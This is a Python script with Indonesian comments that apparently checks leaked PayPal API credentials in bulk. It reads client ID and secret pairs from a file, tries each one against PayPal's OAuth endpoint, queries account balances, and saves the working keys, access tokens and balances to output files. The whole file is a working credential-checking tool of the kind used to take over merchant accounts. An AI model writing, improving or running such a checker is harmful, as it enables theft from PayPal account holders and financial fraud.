import requests
from colorama import Fore, Style

# Inisialisasi colorama
Fore.GREEN, Fore.RED, Style.RESET_ALL  # Untuk kejelasan

# Baca kredensial dari file secret.txt
with open("secret.txt") as f:
    lines = f.read().splitlines()

for line in lines:
    try:
        client_id, client_secret = line.strip().split(":")
    except ValueError:
        print(f"{Fore.RED}Gak Valid client_id >> {line}{Style.RESET_ALL}")
        continue

    # Buat permintaan OAuth menggunakan kredensial tersebut
    url = "https://api.paypal.com/v1/oauth2/token"
    data = {"grant_type": "client_credentials"}

    response = requests.post(url, auth=(client_id, client_secret), data=data)

    # Parse dan simpan hasil yang valid dalam file validkey.txt atau validbalance.txt
    if response.status_code == 200:
        result = response.json()
        access_token = result["access_token"]
        scope = result["scope"]

        # Buat permintaan GET ke endpoint balances
        url = "https://api-m.paypal.com/v1/reporting/balances"
        headers = {"Authorization": f"Bearer {access_token}"}
        response = requests.get(url, headers=headers)

        # Simpan saldo dalam file validbalance.txt jika balance tersedia, atau validkey.txt jika tidak ada balance
        if response.status_code == 200:
            balances = response.json()["balances"]
            balance_str = ""
            for balance in balances:
                currency = balance["currency"]
                available_balance = balance["available_balance"]["value"]
                balance_str += f"balance: {currency}: {available_balance}\n"

            with open("output/ppvalidbalance.txt", "a") as f:
                f.write(f"Client ID: {client_id}\n")
                f.write(f"Secret ID: {client_secret}\n")
                f.write(f"Scope: {scope}\n")
                f.write(f"access_token: {access_token}\n")
                f.write(f"{balance_str}\n")


            print(f"{Fore.GREEN}Valid [Balance OK] >> {client_id}{Style.RESET_ALL}")

        else:
            with open("output/ppvalidkey.txt", "a") as f:
                f.write(f"Client ID: {client_id}\n")
                f.write(f"Secret ID: {client_secret}\n")
                f.write(f"access_token: {access_token}\n")
                f.write(f"Scope: {scope}\n\n")
            print(f"{Fore.GREEN}Valid{Style.RESET_ALL} {Fore.RED}[Balance Bad]{Style.RESET_ALL}{Fore.GREEN} >> {client_id}{Style.RESET_ALL}")

    else:
        print(f"{Fore.RED}[Key Bad] >> {client_id}{Style.RESET_ALL}")
